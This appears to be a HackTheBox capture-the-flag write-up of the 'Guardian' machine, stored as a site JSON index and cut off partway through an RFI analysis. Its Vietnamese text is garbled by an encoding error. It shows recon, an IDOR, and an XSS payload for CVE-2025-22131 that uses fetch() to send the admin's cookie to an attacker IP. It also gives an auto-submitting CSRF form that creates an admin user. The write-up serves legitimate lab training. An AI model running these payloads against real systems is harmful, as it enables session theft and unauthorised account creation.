
[{"content":"","date":"12 November 2025","externalUrl":null,"permalink":"/tags/csrf/","section":"Tags","summary":"","title":"Csrf","type":"tags"},{"content":"","date":"12 November 2025","externalUrl":null,"permalink":"/ctf/","section":"Ctf","summary":"","title":"Ctf","type":"ctf"},{"content":"","date":"12 November 2025","externalUrl":null,"permalink":"/tags/cve-2025-22131/","section":"Tags","summary":"","title":"CVE-2025-22131","type":"tags"},{"content":"","date":"12 November 2025","externalUrl":null,"permalink":"/ctf/hackthebox/","section":"Ctf","summary":"","title":"HackTheBox","type":"ctf"},{"content":" Reconnaissance and Scanning # rustscan -a 10.10.11.84 -- -sC -sV -oN nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHTkehIuVT04tJc00jcFVYdmQYDY3RuiImpFenWc9Yi6 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://guardian.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel ThÃªm domain vÃ  file host\nsudo nano /etc/hosts 10.10.11.84 guardian.htb Enumeration and Gaining access # Web summary # whatweb http://guardian.htb/ â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian] â””â”€$ whatweb http://guardian.htb/ http://guardian.htb/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], Email[GU0142023@guardian.htb,GU0702025@guardian.htb,GU6262023@guardian.htb,admissions@guardian.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.84], Script, Title[Guardian University - Empowering Future Leaders] Dá»±a vÃ o thÃ´ng tin tá»•ng quan, bÆ°á»›c Ä‘áº§u kháº³ng Ä‘á»‹nh Ä‘Ã¢y lÃ  website cá»§a 1 trÆ°á»ng Ä‘áº¡i há»c, chá»©a má»™t sá»‘ thÃ´ng tin vá» sinh viÃªn nhÆ° email. Tá»« Ä‘Ã¢y cÃ³ thá»ƒ biáº¿t Ä‘Æ°á»£c format cá»§a mÃ£ sá»‘ sinh viÃªn (student ID) vÃ  format cá»§a email sinh viÃªn. ThÃ´ng thÆ°á»ng, trong thá»±c táº¿ cÃ¡c trÆ°á»ng Ä‘áº¡i há»c hay láº¥y email sinh viÃªn Ä‘á»ƒ lÃ m thÃ´ng tin Ä‘Äƒng nháº­p vÃ o há»‡ thá»‘ng há»c táº­p cá»§a trÆ°á»ng.\nPhÃ¢n tÃ­ch sÃ¢u hÆ¡n vá» format cá»§a student ID, nÃ³ sáº½ cÃ³ dáº¡ng GUXXXXXX vá»›i:\n4 sá»‘ cuá»‘i dÆ°á»ng nhÆ° lÃ  nÄƒm, cÃ³ thá»ƒ lÃ  nÄƒm mÃ  sinh viÃªn nÃ y vÃ o trÆ°á»ng. Giáº£ sá»­ trÆ°á»ng Ä‘áº¡i há»c nÃ y cÃ³ thá»i gian há»c lÃ  5 nÄƒm, váº­y sá»‘ nÄƒm sáº½ kÃ©o dÃ i tá»« 2021 -\u0026gt; 2025. 3 sá»‘ Ä‘áº§u cÃ³ thá»ƒ lÃ  sá»‘ thá»© tá»± cá»§a sinh viÃªn Ä‘Ã³ trong khÃ³a, tá»« 000 -\u0026gt; 999. NgoÃ i ra cÃ²n cÃ³ email admissions@guardian.htb cÃ³ thá»ƒ lÃ  email quáº£n lÃ½.\nDirectories # dirsearch -u http://guardian.htb [03:42:15] Starting: [03:42:23] 403 - 277B - /.ht_wsr.txt [03:42:23] 403 - 277B - /.htaccess.bak1 [03:42:23] 403 - 277B - /.htaccess.orig [03:42:23] 403 - 277B - /.htaccess.sample [03:42:23] 403 - 277B - /.htaccess.save [03:42:23] 403 - 277B - /.htaccess_extra [03:42:23] 403 - 277B - /.htaccess_sc [03:42:23] 403 - 277B - /.htaccess_orig [03:42:23] 403 - 277B - /.htaccessOLD2 [03:42:23] 403 - 277B - /.htaccessBAK [03:42:23] 403 - 277B - /.htaccessOLD [03:42:23] 403 - 277B - /.htm [03:42:23] 403 - 277B - /.html [03:42:23] 403 - 277B - /.htpasswds [03:42:23] 403 - 277B - /.htpasswd_test [03:42:23] 403 - 277B - /.httr-oauth [03:42:24] 403 - 277B - /.php [03:42:26] 301 - 309B - /js -\u0026gt; http://guardian.htb/js/ [03:42:42] 403 - 277B - /cgi-bin/ [03:42:43] 301 - 310B - /css -\u0026gt; http://guardian.htb/css/ [03:42:47] 301 - 313B - /images -\u0026gt; http://guardian.htb/images/ [03:42:47] 403 - 277B - /images/ [03:42:48] 404 - 16B - /index.php/login/ [03:42:48] 301 - 317B - /javascript -\u0026gt; http://guardian.htb/javascript/ [03:42:48] 403 - 277B - /js/ [03:42:53] 403 - 277B - /php5.fcgi [03:42:55] 403 - 277B - /server-status/ [03:42:55] 403 - 277B - /server-status Sau khi truy cáº­p cÃ¡c directories vÃ  phÃ¢n tÃ­ch, khÃ´ng tÃ¬m tháº¥y thÃ´ng tin Ä‘Ã¡ng chÃº Ã½ nÃ o cÃ³ thá»ƒ dÃ¹ng Ä‘á»ƒ lÃ m dá»¯ liá»‡u khai thÃ¡c.\nVhosts # Thá»­ ffuf láº§n Ä‘áº§u tiÃªn, phÃ¡t hiá»‡n ra size cá»§a web lÃ  6741, thÃªm filter size vá»›i options -fs\nffuf -u http://guardian.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt -H \u0026#34;Host: FUZZ.guardian.htb\u0026#34; -r -t 20 -fs 6741 â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian] â””â”€$ ffuf -u http://guardian.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt -H \u0026#34;Host: FUZZ.guardian.htb\u0026#34; -r -t 30 -fs 6741 -fw 1 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://guardian.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt :: Header : Host: FUZZ.guardian.htb :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 30 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 6741 :: Filter : Response words: 1 ________________________________________________ gitea [Status: 200, Size: 13498, Words: 1049, Lines: 245, Duration: 57ms] portal [Status: 200, Size: 2900, Words: 896, Lines: 84, Duration: 64ms] ThÃªm 2 vhost má»›i vÃ o file hosts\nsudo nano /etc/hosts 10.10.11.84 guardian.htb gitea.guardian.htb portal.guardian.htb Truy cáº­p vÃ o trang web vÃ  tÃ¬m tháº¥y nÆ¡i truy cáº­p portal.guardian.htb\nXem qua trang site chÃ­nh thá»©c cá»§a trÆ°á»ng vÃ  tháº¥y má»™t sá»‘ thÃ´ng tin Ä‘Ã£ dá»± Ä‘oÃ¡n á»Ÿ trÃªn.\nportal.guardian.htb # ÄÃ¢y chÃ­nh lÃ  pháº§n truy cáº­p vÃ o há»‡ thá»‘ng cá»§a trÆ°á»ng. Má»¥c tiÃªu lÃ  tÃ¬m ra Username vÃ  Pasword. Ngay khi vÃ o trang, 1 popup thÃ´ng bÃ¡o vá» viá»‡c checkout Portal Guide\nTá»« Portal Guide biáº¿t Ä‘Æ°á»£c má»i user khi Ä‘Æ°á»£c táº¡o má»›i Ä‘á»u cÃ³ default password lÃ  GU1234. Trong thá»±c táº¿, khÃ¡ nhiá»u sinh viÃªn khÃ´ng Ä‘á»•i password sau khi Ä‘Äƒng nháº­p láº§n Ä‘áº§u vÃ¬ cáº£m tháº¥y khÃ´ng quan trá»ng.\nKáº¿t há»£p vá»›i nhá»¯ng dá»¯ kiá»‡n Ä‘Ã£ dá»± Ä‘oÃ¡n phÃ­a trÃªn, tÃ´i sáº½ thá»­ vá»›i 3 user Ä‘Æ°á»£c Ä‘á» cáº­p trÃªn trang chá»§ cá»§a trÆ°á»ng vÃ  default password vÃ  nháº­n Ä‘Æ°á»£c káº¿t quáº£ lÃ  user GU0142023 khÃ´ng Ä‘á»•i password, cÃ³ thá»ƒ login báº±ng default password.\nLÆ°á»›t qua cÃ¡c thÃ nh pháº§n cá»§a há»‡ thá»‘ng há»c táº­p nÃ y, cÃ³ má»™t sá»‘ thÃ´ng tin ná»•i báº­t Ä‘Ã¡ng chÃº Ã½:\nMy Course Ä‘á»ƒ xem cÃ¡c mÃ´n Ä‘ang há»c. Assignments bao gá»“m cÃ¡c bÃ i táº­p Ä‘Ã£ hoÃ n thÃ nh vÃ  cÃ¡c bÃ i táº­p Ä‘ang thá»±c hiá»‡n. KhÃ´ng thá»ƒ xem Ä‘Æ°á»£c thÃ´ng tin cá»§a cÃ¡c bÃ i táº­p Ä‘Ã£ quÃ¡ háº¡n, chá»‰ truy cáº­p Ä‘Æ°á»£c cÃ¡c bÃ i táº­p Ä‘ang trong quÃ¡ trÃ¬nh thá»±c hiá»‡n. Chats bao gá»“m cÃ¡c tin nháº¯n giá»¯a cÃ¡c sinh viÃªn. Notice Board chá»©a thÃ´ng bÃ¡o cá»§a táº¥t cáº£ thÃ nh viÃªn. Truy cáº­p My Course -\u0026gt; View Course tÃ´i xem Ä‘Æ°á»£c thÃ´ng tin mÃ´n há»c vÃ  cÃ³ thá»ƒ chuyá»ƒn hÆ°á»›ng Ä‘áº¿n Assignments hoáº·c Grades.\nTrong Assignments chá»‰ cÃ³ 1 bÃ i táº­p Ä‘ang thá»±c hiá»‡n. Xem chi tiáº¿t, cÃ³ má»™t nÆ¡i Ä‘á»ƒ ná»™p bÃ i táº­p, pháº§n upload nÃ y chá»‰ cho phÃ©p file .doc vÃ  .xlsx\nIDOR # Truy cáº­p pháº§n Chats, tÃ´i cÃ³ thá»ƒ thá»±c hiá»‡n type báº¥t ká»³ Ä‘iá»u gÃ¬.\nTuy nhiÃªn Ä‘á»ƒ Ã½ URL cÃ³ má»™t format khÃ¡ quen thuá»™c ../index.php?page=. Thá»­ cÃ¡c lá»— há»•ng phá»• biáº¿n cho format nÃ y nhÆ° LFI, Broken Access Control, v.v\u0026hellip; TÃ´i tÃ¬m Ä‘Æ°á»£c lá»— há»•ng IDOR, cÃ³ thá»ƒ truy cáº­p Ä‘oáº¡n há»™i thoáº¡i cá»§a nhá»¯ng sinh viÃªn khÃ¡c mÃ  khÃ´ng cáº§n truy cáº­p vÃ o user cá»§a há» chá»‰ báº±ng cÃ¡ch thay Ä‘á»•i ID cá»§a chat_users.\nTá»« Ä‘Ã¢y tÃ´i cÅ©ng biáº¿t Ä‘Æ°á»£c user hiá»‡n táº¡i GU0142023 Ä‘ang cÃ³ ID lÃ  13. Thá»­ thay Ä‘á»•i ID thÃ nh nhá»¯ng sá»‘ thá»© tá»± Ä‘áº§u tiÃªn Ä‘á»ƒ tÃ¬m admin user, vÃ¬ theo logic thÃ´ng thÆ°á»ng, nhá»¯ng user cÃ³ Ä‘áº·c quyá»n cao luÃ´n Ä‘Æ°á»£c khá»Ÿi táº¡o cÃ¹ng vá»›i há»‡ thá»‘ng vÃ  thÆ°á»ng cÃ³ ID 0 hoáº·c 1.\nSau khi thay Ä‘á»•i chat thÃ nh ID 1 vÃ  2 thÃ¬ tÃ´i nháº­n Ä‘Æ°á»£c thÃ´ng tin Ä‘Äƒng nháº­p má»›i cá»§a user jamil.enockson, vÃ  theo nhÆ° cÃ¢u phÃ­a trÆ°á»›c thÃ¬ Ä‘Ã¢y lÃ  thÃ´ng tin Ä‘Äƒng nháº­p cá»§a gitea, má»™t trong 2 vhost Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c á»Ÿ pháº§n trÃªn.\ngitea.guardian.htb # Truy cáº­p gitea vá»›i thÃ´ng tin Ä‘Äƒng nháº­p vá»«a tÃ¬m Ä‘Æ°á»£c. Tuy nhiÃªn khi Ä‘Äƒng nháº­p báº±ng tÃªn vÃ  password thÃ¬ khÃ´ng Ä‘Æ°á»£c. TÃ´i quyáº¿t Ä‘á»‹nh thÃªm Ä‘uÃ´i @guardian.htb Ä‘á»ƒ Ä‘Äƒng nháº­p báº±ng email vÃ  thÃ nh cÃ´ng.\nVá»›i gitea version 1.23.7 tÃ´i khÃ´ng tÃ¬m tháº¥y exploit nÃ o cÃ³ thá»ƒ khai thÃ¡c Ä‘Æ°á»£c nÃªn sáº½ táº¡m thá»i bá» qua hÆ°á»›ng nÃ y.\nTrong Explore tÃ´i cÃ³ 2 repositories, lÃ  source code cá»§a 2 site guardian.htb vÃ  portal.guardian.htb. PhÃ¢n tÃ­ch 2 source nÃ y thÃ¬ trang chá»§ khÃ´ng cÃ³ nhiá»u Ã½ nghÄ©a, chuyá»ƒn sang portal tÃ´i tÃ¬m Ä‘Æ°á»£c má»™t sá»‘ thÃ´ng tin há»¯u Ã­ch.\nDÃ nh 1 khoáº£ng thá»i gian tÆ°Æ¡ng Ä‘á»‘i Ä‘á»ƒ phÃ¢n tÃ­ch toÃ n bá»™ source code cá»§a portal, trong /config/config.php tÃ´i tÃ¬m Ä‘Æ°á»£c thÃ´ng tin Ä‘Äƒng nháº­p mysql cá»§a user root\nTrong /student/submission.php tÃ´i tÃ¬m tháº¥y Ä‘oáº¡n server lÆ°u file bÃ i táº­p khi ngÆ°á»i dÃ¹ng upload lÃªn server. File upload sáº½ Ä‘Æ°á»£c lÆ°u trong ../attachment_uploads/ vá»›i 0777 permission.\nFile composer.json á»Ÿ ngay bÃªn ngoÃ i repo liá»‡t kÃª cÃ¡c thÆ° viá»‡n yÃªu cáº§u vÃ  phiÃªn báº£n cá»§a nÃ³.\nCVE-2025-22131 # Thá»­ tÃ¬m kiáº¿m lá»— há»•ng cá»§a 2 thÆ° viá»‡n nÃ y, tÃ´i tÃ¬m Ä‘Æ°á»£c CVE-2025-22131, má»™t lá»— há»•ng cá»§a phpoffice/phpspreadsheet 3.7.0. NÃ³i qua má»™t chÃºt vá» thÆ° viá»‡n nÃ y, Ä‘Ã¢y lÃ  thÆ° viá»‡n cá»§a PHP Ä‘á»ƒ xá»­ lÃ½ (Ä‘á»c/ghi) cÃ¡c file spreadsheet nhÆ° .xlsx. Khi thÆ° viá»‡n chuyá»ƒn má»™t file XLSX thÃ nh dáº¡ng HTML vÃ  hiá»ƒn thá»‹ ra mÃ n hÃ¬nh, pháº§n Ä‘iá»u hÆ°á»›ng (navigation menu) giá»¯a cÃ¡c sheet báº±ng tÃªn sheet cÃ³ thá»ƒ chÃ¨n Ä‘Æ°á»£c malicious code.\nTÃ´i cÅ©ng tÃ¬m Ä‘Æ°á»£c PoC cá»§a lá»— há»•ng nÃ y trÃªn github. Poc nÃ y sáº½ táº¡o 1 file .xlsx cÃ³ chá»©a XSS payload, khi upload thÃ nh cÃ´ng, web server sáº½ xá»­ lÃ½ file vÃ  thá»±c hiá»‡n payload.\nClone git repo\ngit clone https://github.com/s0ck37/CVE-2025-22131-POC.git cd CVE-2025-22131-POC Lá»£i dá»¥ng lá»— há»•ng Ä‘á»ƒ upload XSS payload láº¥y cookie cá»§a admin, táº¡o 1 http listener Ä‘á»ƒ nháº­n cookie tráº£ vá» tá»« server\npython3 -m http.server python3 generate.py \u0026#39;\u0026lt;script\u0026gt;fetch(\u0026#34;http://10.10.14.165:8000/\u0026#34;+document.cookie)\u0026lt;/script\u0026gt;\u0026#39; File .xlsx Ä‘Æ°á»£c táº¡o thÃ nh cÃ´ng\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian/CVE-2025-22131-POC] â””â”€$ python3 generate.py \u0026#39;\u0026lt;script\u0026gt;fetch(\u0026#34;http://10.10.14.165:8000/\u0026#34;+document.cookie)\u0026lt;/script\u0026gt;\u0026#39; CVE-2025-22131 XSS Exploit by s0ck37 Usage: python3 generate.py \u0026lt;html\u0026gt; Example: python3 generate.py \u0026#34;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34; Reading sample spreadsheet Embedding injection Generating final xslx Exploit written to exploit.xlsx Upload file nÃ y lÃªn pháº§n Assignments cá»§a portal\nSau khi upload thÃ nh cÃ´ng, quay trá»Ÿ láº¡i listener, tÃ´i nháº­n Ä‘Æ°á»£c cookie\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian/CVE-2025-22131-POC] â””â”€$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.11.84 - - [14/Nov/2025 04:00:38] code 404, message File not found 10.10.11.84 - - [14/Nov/2025 04:00:38] \u0026#34;GET /PHPSESSID=suu0tijql6n34d37k1nq05d1g2 HTTP/1.1\u0026#34; 404 - Sao chÃ©p token nÃ y vÃ o Cookie Editor,.\nLÆ°u cookie vÃ  táº£i láº¡i trang, tÃ´i cÃ³ Ä‘Æ°á»£c phiÃªn truy cáº­p cá»§a user sammy.treat.\nSSRF - CSRF # Sau khi thá»±c hiá»‡n cÃ¡c chá»©c nÄƒng cá»§a portal vá»›i user sammy.treat cÃ³ quyá»n lecture, tÃ´i tÃ¬m Ä‘Æ°á»£c lá»— há»•ng SSRF trong pháº§n Notice Board.\nQuyá»n lecture cho phÃ©p user Ä‘Æ°á»£c táº¡o Notice, bÃªn trong notice cÃ³ pháº§n Reference Link (will be reviewed by admin), cÃ³ nghÄ©a lÃ  sau khi táº¡o notice, admin sáº½ xá»­ lÃ½ link nÃ y. Váº­y thÃ¬ tÃ´i sáº½ thá»­ táº¡o notice vÃ  yÃªu cáº§u admin táº£i lÃªn server 1 file tá»« attack machine.\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian/CVE-2025-22131-POC] â””â”€$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.11.84 - - [14/Nov/2025 07:51:14] \u0026#34;GET /exploit.xlsx HTTP/1.1\u0026#34; 200 - Máº·c dÃ¹ Ä‘Ã£ thá»­ thay revershell vÃ  upload thÃ nh cÃ´ng lÃªn server nhÆ°ng tÃ´i khÃ´ng thá»ƒ kÃ­ch hoáº¡t Ä‘Æ°á»£c nÃ³ chá»‰ báº±ng SSRF. Váº­y nÃªn chuyá»ƒn sang 1 hÆ°á»›ng khÃ¡c Ä‘Ã³ lÃ  dá»±a vÃ o role cá»§a user.\nDá»±a vÃ o source code trÃªn gitea thÃ¬ portal chá»‰ cÃ³ 3 quyá»n cho user lÃ  student, lecture vÃ  admin. Váº­y thay vÃ¬ tÃ¬m cÃ¡ch Ä‘á»ƒ láº¥y admin user thÃ¬ tÃ´i cÃ³ thá»ƒ tÃ¬m cÃ¡ch táº¡o 1 user vá»›i quyá»n admin, vÃ¬ dÃ¹ sao thÃ¬ tÃ´i cÅ©ng náº¯m source code trong tay.\nTÃ¬m kiáº¿m trong repo, cÃ³ admin/createuser.php\n\u0026lt;?php require \u0026#39;../includes/auth.php\u0026#39;; require \u0026#39;../config/db.php\u0026#39;; require \u0026#39;../models/User.php\u0026#39;; require \u0026#39;../config/csrf-tokens.php\u0026#39;; $token = bin2hex(random_bytes(16)); add_token_to_pool($token); if (!isAuthenticated() || $_SESSION[\u0026#39;user_role\u0026#39;] !== \u0026#39;admin\u0026#39;) { header(\u0026#39;Location: /login.php\u0026#39;); exit(); } $config = require \u0026#39;../config/config.php\u0026#39;; $salt = $config[\u0026#39;salt\u0026#39;]; $userModel = new User($pdo); if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { $csrf_token = $_POST[\u0026#39;csrf_token\u0026#39;] ?? \u0026#39;\u0026#39;; if (!is_valid_token($csrf_token)) { die(\u0026#34;Invalid CSRF token!\u0026#34;); } $username = $_POST[\u0026#39;username\u0026#39;] ?? \u0026#39;\u0026#39;; $password = $_POST[\u0026#39;password\u0026#39;] ?? \u0026#39;\u0026#39;; $full_name = $_POST[\u0026#39;full_name\u0026#39;] ?? \u0026#39;\u0026#39;; $email = $_POST[\u0026#39;email\u0026#39;] ?? \u0026#39;\u0026#39;; $dob = $_POST[\u0026#39;dob\u0026#39;] ?? \u0026#39;\u0026#39;; $address = $_POST[\u0026#39;address\u0026#39;] ?? \u0026#39;\u0026#39;; $user_role = $_POST[\u0026#39;user_role\u0026#39;] ?? \u0026#39;\u0026#39;; // Check for empty fields if (empty($username) || empty($password) || empty($full_name) || empty($email) || empty($dob) || empty($address) || empty($user_role)) { $error = \u0026#34;All fields are required. Please fill in all fields.\u0026#34;; } else { $password = hash(\u0026#39;sha256\u0026#39;, $password . $salt); $data = [ \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password_hash\u0026#39; =\u0026gt; $password, \u0026#39;full_name\u0026#39; =\u0026gt; $full_name, \u0026#39;email\u0026#39; =\u0026gt; $email, \u0026#39;dob\u0026#39; =\u0026gt; $dob, \u0026#39;address\u0026#39; =\u0026gt; $address, \u0026#39;user_role\u0026#39; =\u0026gt; $user_role // CÃ³ thá»ƒ set role tÃ¹y Ã½!!! ]; if ($userModel-\u0026gt;create($data)) { header(\u0026#39;Location: /admin/users.php?created=true\u0026#39;); exit(); } else { $error = \u0026#34;Failed to create user. Please try again.\u0026#34;; } } } ?\u0026gt; TÃ´i nháº­n ra náº¿u láº¥y Ä‘Æ°á»£c csrf_token cá»§a admin user lÃ  cÃ³ thá»ƒ táº¡o Ä‘Æ°á»£c user vá»›i báº¥t ká»³ quyá»n nÃ o, vÃ¬ code sáº½ trá»±c tiáº¿p gÃ¡n role cho user mÃ  khÃ´ng qua bÆ°á»›c kiá»ƒm tra nÃ o.\nconfig/csrf_token.php\n\u0026lt;?php $global_tokens_file = __DIR__ . \u0026#39;/tokens.json\u0026#39;; function get_token_pool() { global $global_tokens_file; return file_exists($global_tokens_file) ? json_decode(file_get_contents($global_tokens_file), true) : []; } function add_token_to_pool($token) { global $global_tokens_file; $tokens = get_token_pool(); $tokens[] = $token; file_put_contents($global_tokens_file, json_encode($tokens)); } function is_valid_token($token) { $tokens = get_token_pool(); return in_array($token, $tokens); } Nháº­n tháº¥y cÃ³ lá»— há»•ng CSRF khÃ¡ nghiÃªm trá»ng á»Ÿ Ä‘Ã¢y:\nadd_token_to_pool() chá»‰ thÃªm token vÃ o pool mÃ  khÃ´ng xÃ³a token cÅ© Ä‘Ã£ tá»“n táº¡i. Táº¡o token nhÆ°ng khÃ´ng gÃ¡n vá»›i session cá»¥ thá»ƒ nÃ o, chá»‰ cáº§n token Ä‘Ã£ tá»“n táº¡i trong pool thÃ¬ ai cÅ©ng cÃ³ thá»ƒ sá»­ dá»¥ng token Ä‘Ã³, khÃ´ng cáº§n biáº¿t user nÃ o Ä‘Ã£ táº¡o. Token khÃ´ng Ä‘Æ°á»£c giá»›i háº¡n thá»i gian nÃªn khÃ´ng háº¿t háº¡n. Tá»« nhá»¯ng dá»¯ kiá»‡n trÃªn, tÃ´i cÃ³ thá»ƒ sá»­ dá»¥ng user Lecturer Ä‘á»ƒ táº¡o csrf token má»›i, sau Ä‘Ã³ táº¡o 1 form submit createuser báº±ng html, lá»«a admin user click vÃ o reference_link táº£i file lÃªn vÃ  má»Ÿ, tá»« Ä‘Ã³ form submit sáº½ gá»­i POST request Ä‘áº¿n server vá»›i admin role Ä‘á»ƒ táº¡o 1 user má»›i vá»›i role admin\nTruy cáº­p form Create Notice Ä‘á»ƒ láº¥y csrf_token cá»§a response vá»›i PHPSESSID cá»§a lecturer user.\ncurl http://portal.guardian.htb/lecturer/notices/create.php --cookie \u0026#34;PHPSESSID=\u0026lt;token\u0026gt;\u0026#34; | grep \u0026#34;csrf_token\u0026#34; â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian/CVE-2025-22131-POC] â””â”€$ curl -v http://portal.guardian.htb/lecturer/notices/create.php --cookie \u0026#34;PHPSESSID=qvqtkv29v2ukncotu7cutusmpc\u0026#34; | grep \u0026#34;csrf_token\u0026#34; % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 6229 0 6229 0 0 19390 0 --:--:-- --:--:-- --:--:-- 19404 \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf_token\u0026#34; value=\u0026#34;594c787ec53f1f368b73aa653f9b9ecf\u0026#34;\u0026gt; LÆ°u láº¡i token nÃ y vÃ  táº¡o 1 form create user báº±ng html\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Inconspicuous Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form id=\u0026#34;create-user\u0026#34; action=\u0026#34;http://portal.guardian.htb/admin/createuser.php\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;john\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;password\u0026#34; value=\u0026#34;GU1234\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;full_name\u0026#34; value=\u0026#34;John Doe\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;john.doe@guardian.htb\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;dob\u0026#34; value=\u0026#34;1999-01-01\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;address\u0026#34; value=\u0026#34;New York, Mahattan\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;user_role\u0026#34; value=\u0026#34;admin\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;csrf_token\u0026#34; value=\u0026#34;594c787ec53f1f368b73aa653f9b9ecf\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script\u0026gt; document.getElementById(\u0026#34;create-user\u0026#34;).submit(); \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; Táº¡o 1 file .html Ä‘á»ƒ lÆ°u láº¡i ná»™i dung form submit, vÃ­ dá»¥ nhÆ° new.html\nBáº­t python http server vÃ  thá»±c hiá»‡n upload file nÃ y báº±ng Create Notice\nNotice created successfully. It is pending approval by the admin.\nLogin vá»›i username vÃ  password vá»«a táº¡o vÃ  láº¥y token cá»§a user john rá»“i lÆ°u vÃ o file cookie.txt.\ncurl -X POST http://portal.guardian.htb/login.php -d \u0026#34;username=john\u0026amp;password=GU1234\u0026#34; -c cookie.txt â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian/CVE-2025-22131-POC] â””â”€$ cat cookie.txt # Netscape HTTP Cookie File # https://curl.se/docs/http-cookies.html # This file was generated by libcurl! Edit at your own risk. portal.guardian.htb FALSE / FALSE 0 PHPSESSID lcq2et7jkams7mclsijr04sj6c Copy token nÃ y vÃ  paste vÃ o Cookie-Editor trÃªn browser, lÆ°u láº¡i vÃ  táº£i láº¡i trang. VÃ¬ token khÃ´ng bao giá» háº¿t háº¡n nÃªn tÃ´i sáº½ lÆ°u láº¡i token nÃ y Ä‘á»ƒ sá»­ dá»¥ng, khÃ´ng cáº§n thÃ´ng qua session cá»§a lecturer user ná»¯a.\nRFI # Trong Admin panel, tÃ´i cÃ³ thÃªm 1 pháº§n má»›i lÃ  Reports. Truy cáº­p vÃ o site nÃ y, nhÃ¬n tháº¥y URL vá»›i format quen thuá»™c vÃ  nghÄ© ngay Ä‘áº¿n viá»‡c thá»­ má»™t cÃ¡c lá»— há»•ng phá»• biáº¿n.\nServer tráº£ vá» má»™t lá»—i tÆ°Æ¡ng á»©ng vá»›i input nháº­p vÃ o. Quay trá»Ÿ láº¡i source code Ä‘á»ƒ kiá»ƒm tra admin/reports.php\n\u0026lt;?php require \u0026#39;../includes/auth.php\u0026#39;; require \u0026#39;../config/db.php\u0026#39;; if (!isAuthenticated() || $_SESSION[\u0026#39;user_role\u0026#39;] !== \u0026#39;admin\u0026#39;) { header(\u0026#39;Location: /login.php\u0026#39;); exit(); } $report = $_GET[\u0026#39;report\u0026#39;] ?? \u0026#39;reports/academic.php\u0026#39;; if (strpos($report, \u0026#39;..\u0026#39;) !== false) { die(\u0026#34;\u0026lt;h2\u0026gt;Malicious request blocked ğŸš« \u0026lt;/h2\u0026gt;\u0026#34;); } if (!preg_match(\u0026#39;/^(.*(enrollment|academic|financial|system)\\.php)$/\u0026#39;, $report)) { die(\u0026#34;\u0026lt;h2\u0026gt;Access denied. Invalid file ğŸš«\u0026lt;/h2\u0026gt;\u0026#34;); } ?\u0026gt; CÃ³ 2 bá»™ lá»c kiá»ƒm tra URL:\nNáº¿u trong URL chá»©a .. thÃ¬ tráº£ vá» lá»—i Malicious request blocked URL buá»™c pháº£i káº¿t thÃºc báº±ng 